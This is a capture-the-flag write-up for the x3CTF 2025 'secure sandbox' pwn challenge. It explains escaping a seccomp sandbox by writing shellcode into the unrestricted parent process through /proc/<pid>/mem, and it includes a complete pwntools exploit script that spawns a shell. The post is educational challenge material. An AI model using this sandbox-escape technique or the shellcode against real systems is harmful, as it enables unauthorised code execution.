---
title: secure sandbox
description: I love to make little games. But this time something seems to be different. If you win you might even get a flag...
categories: ["ctf", "x3CTF 2025"]
tags: ["pwn"]
media_subpath: "/assets/posts/2025/x3ctf/secure-sandbox"
---

We have a shellcode runner protected by seccomp:

![](01.png)

We can use `seccomp-tools` to see the syscalls we are allowed to perform:

![](02.png)

We can `open`, we can `write`, but we can't `read`. However, we notice an interesting thing: the shellcode runner is
forked. It also prints the PID of the main process, which is not protected by seccomp. We also notice in the Dockerfile
that the application is running as root.

There is a special file in `procfs` called `mem`, for each process, containing a file-like object that can be used to
write and read memory of other processes (requires special permissions, or root access). This is powerful because we can
write any memory region, even read-execute memory like the text segment. The binary does not have PIE, so we can directly
write to the instructions after the `waitpid` call in the parent. Then the parent can execute any shellcode.

The exploit path is as follows:
- call `open` on `/proc/<pid>/mem` with `O_WRONLY`
- call `lseek` to the target memory address with `SEEK_SET`
- call `write` and pass the shellcode buffer
- call `exit` so the parent's `waitpid` finishes
- the main process will execute the modified memory

P.S. I didn't notice we can use `write` so I used `writev`, it does the same thing but it's more convoluted :D

```py
from pwn import *

context.terminal = ["ghostty", "-e"]
context.binary = ELF("./chall")

'''
io = gdb.debug("./chall", """
    c
""")
'''
io = remote("c1afb7ae-f973-4fff-bbfc-aa1dc6b99340.x3c.tf", 31337, ssl=True)

TARGET = 0x401c8f
shell = asm("""
        xor rsi, rsi
        push rsi
        mov rdi, 0x68732f2f6e69622f
        push rdi
        push rsp
        pop rdi
        push SYS_execve
        pop rax
        syscall
""")
shell = repr(list(shell))[1:-1]

io.readuntil(b"with pid: ")
pid = int(io.readline().strip())
print(f"{pid = }")
io.clean()
io.send(asm(f"""
    jmp start
file:
    .asciz "/proc/{pid}/mem"
shellcode:
    .byte {shell}
    .equ shellcode_len, $ - shellcode

start:
    lea rdi, [rip + file]
    mov rsi, O_WRONLY
    mov rdx, 0
    mov rax, SYS_open
    syscall
    mov r12, rax

    mov rdi, r12
    mov rsi, {hex(TARGET)}
    mov rdx, SEEK_SET
    mov rax, SYS_lseek
    syscall

    mov rdi, r12
    push shellcode_len
    lea rbx, [rip + shellcode]
    push rbx
    push rsp
    pop rsi
    mov rdx, 1
    mov rax, SYS_writev
    syscall

    mov rdi, 0
    mov rax, SYS_exit
    syscall
"""))

io.interactive()
```
